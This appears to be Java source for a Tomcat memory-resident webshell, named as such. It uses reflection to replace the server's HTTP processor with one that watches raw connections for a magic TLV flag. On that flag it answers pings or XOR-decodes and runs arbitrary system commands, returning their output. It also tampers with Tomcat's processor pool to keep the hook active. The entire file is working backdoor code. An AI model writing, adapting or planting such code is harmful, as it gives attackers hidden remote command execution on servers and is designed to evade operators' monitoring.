package org.example;

import org.apache.catalina.connector.Connector;
import org.apache.catalina.connector.Request;
import org.apache.coyote.*;
import org.apache.coyote.http11.Http11NioProtocol;
import org.apache.coyote.http11.Http11Processor;
import org.apache.tomcat.util.net.*;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.Collections;

@WebServlet(urlPatterns = "/test")
public class webshell extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Field reqF = req.getClass().getDeclaredField("request");
            reqF.setAccessible(true);
            Request request = (Request) reqF.get(req);
            Connector connector = request.getConnector();
            Http11NioProtocol protocolHandler = (Http11NioProtocol) connector.getProtocolHandler();
            Field handler = protocolHandler.getClass().getSuperclass().getSuperclass().getSuperclass()
                    .getDeclaredField("handler");
            handler.setAccessible(true);
            Object hd = handler.get(protocolHandler);

            Field proto = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler")
                    .getDeclaredField("proto");
            proto.setAccessible(true);
            Http11NioProtocol protocol = (Http11NioProtocol) proto.get(hd);
            Adapter adapter = protocol.getAdapter();
            Field endpoint = protocol.getClass().getSuperclass().getSuperclass().getSuperclass()
                    .getDeclaredField("endpoint");
            endpoint.setAccessible(true);
            AbstractEndpoint endpoint1 = (AbstractEndpoint) endpoint.get(protocol);
            Http11NioProtocol protocol1 = new Http11NioProtocol() {
                @Override
                protected Processor createProcessor() {
                    Http11Processor http11Processor = new Http11Processor(protocol.getMaxHttpHeaderSize(),
                            protocol.getAllowHostHeaderMismatch(),
                            protocol.getRejectIllegalHeaderName(), endpoint1,
                            protocol.getMaxTrailerSize(),
                            Collections.singleton(protocol.getAllowedTrailerHeaders()),
                            protocol.getMaxExtensionSize(),
                            protocol.getMaxSwallowSize(),
                            null,
                            protocol.getSendReasonPhrase(),
                            protocol.getRelaxedPathChars(),
                            protocol.getRelaxedQueryChars()) {
                        @Override
                        public AbstractEndpoint.Handler.SocketState process(SocketWrapperBase<?> socketWrapper,
                                                                            SocketEvent status) throws IOException {
                            if (status == SocketEvent.OPEN_READ) {
                                ByteBuffer buffer = ByteBuffer.allocate(4);
//                                socketWrapper.read(false, buffer);
                                ByteBuffer readBuffer = socketWrapper.getSocketBufferHandler().getReadBuffer();
                                // WebShell的flag
                                int read = socketWrapper.read(true, buffer);
                                if (read < 4) {
                                    readBuffer.position(0);
                                    return super.process(socketWrapper, status);
                                }
                                if (!tlv.validate(buffer.array())) {
                                    readBuffer.position(0);
                                    return service(socketWrapper);
                                }
                                // 获取长度
                                switch (readBuffer.get()) {
                                    // 执行ping检测
                                    case 0x01:
                                        byte[] encode = new tlv.Response((byte) 0x01, (byte) 0x00, null).encode();
                                        socketWrapper.write(false, ByteBuffer.wrap(encode));
                                        socketWrapper.flush(false);
                                        return AbstractEndpoint.Handler.SocketState.CLOSED;
                                    case 0x02:
                                        // 读取长度
                                        byte[] lengthBytes = new byte[4];
                                        readBuffer.get(lengthBytes);
                                        int length = ((lengthBytes[0] & 0xFF) << 24) |
                                                ((lengthBytes[1] & 0xFF) << 16) |
                                                ((lengthBytes[2] & 0xFF) << 8) |
                                                (lengthBytes[3] & 0xFF);
                                        // 读取数据
                                        if (length > 0) {
                                            byte[] data = new byte[length];
                                            readBuffer.get(data);
                                            String command = new String(tlv.xorProcess(data));
                                            Process exec = Runtime.getRuntime().exec(command);

                                            // 读取命令执行结果
                                            java.io.InputStream processInputStream = exec.getInputStream();
                                            java.io.ByteArrayOutputStream result = new java.io.ByteArrayOutputStream();
                                            byte[] tempBuffer = new byte[1024];
                                            int readLength;
                                            while ((readLength = processInputStream.read(tempBuffer)) != -1) {
                                                result.write(tempBuffer, 0, readLength);
                                            }

                                            // 读取错误流
                                            java.io.InputStream errorStream = exec.getErrorStream();
                                            while ((readLength = errorStream.read(tempBuffer)) != -1) {
                                                result.write(tempBuffer, 0, readLength);
                                            }

                                            try {
                                                // 等待命令执行完成
                                                exec.waitFor();
                                            } catch (InterruptedException e) {
                                                Thread.currentThread().interrupt();
                                                result.write("\nCommand execution interrupted".getBytes());
                                            }

                                            // 发送执行结果
                                            byte[] responseData = new tlv.Response((byte) 0x02, (byte) 0x00,
                                                    result.toByteArray()).encode();
                                            socketWrapper.write(false, ByteBuffer.wrap(responseData));
                                            socketWrapper.flush(false);
                                            return AbstractEndpoint.Handler.SocketState.CLOSED;
                                        }
                                        break;
                                    default:
                                        return service(socketWrapper);
                                }
                                // SocketBufferHandler socketBufferHandler =
                                // socketWrapper.getSocketBufferHandler();
                                // socketBufferHandler.configureReadBufferForRead();
                                // ByteBuffer readBuffer = socketBufferHandler.getReadBuffer();
                                // ByteBuffer readBuffer1 = readBuffer;
                            }
                            return service(socketWrapper);
                        }
                    };
                    http11Processor.setAdapter(adapter);
                    return http11Processor;
                }
            };
            protocol1.setAdapter(adapter);
            proto.set(hd, protocol1);
            Field recycledProcessors = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler")
                    .getDeclaredField("recycledProcessors");
            recycledProcessors.setAccessible(true);
            Object o = recycledProcessors.get(hd);
            Field stack = o.getClass().getSuperclass().getDeclaredField("stack");
            stack.setAccessible(true);
            Object[] objects = new Object[128];
            stack.set(o, objects);
            Field index = o.getClass().getSuperclass().getDeclaredField("index");
            index.setAccessible(true);
            index.set(o, -3);
        } catch (Exception exception) {
            System.out.println(exception.getMessage());
        }
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
